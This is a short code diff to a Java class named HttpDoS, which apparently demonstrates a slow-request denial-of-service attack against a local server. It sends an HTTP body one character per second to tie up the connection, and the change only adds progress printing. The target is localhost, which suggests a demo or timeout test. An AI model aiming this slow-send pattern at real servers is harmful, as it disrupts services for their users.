@@ -16,7 +16,7 @@ public class HttpDoS {
     public static void main(String... args) {
         String HOST = "127.0.0.1";
         int PORT = 4711;
-
+        System.out.println("Connecting...");
         try (Socket socket = new Socket(HOST, PORT)) {
 
             PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
@@ -25,6 +25,7 @@ public class HttpDoS {
             out.println("Content-Length: 12");
             out.println();
             for (int i = 0; i < 12; i++) {
+                System.out.print(".");
                 out.print("Hello World!".charAt(i));
                 out.flush();
                 Thread.sleep(1000);
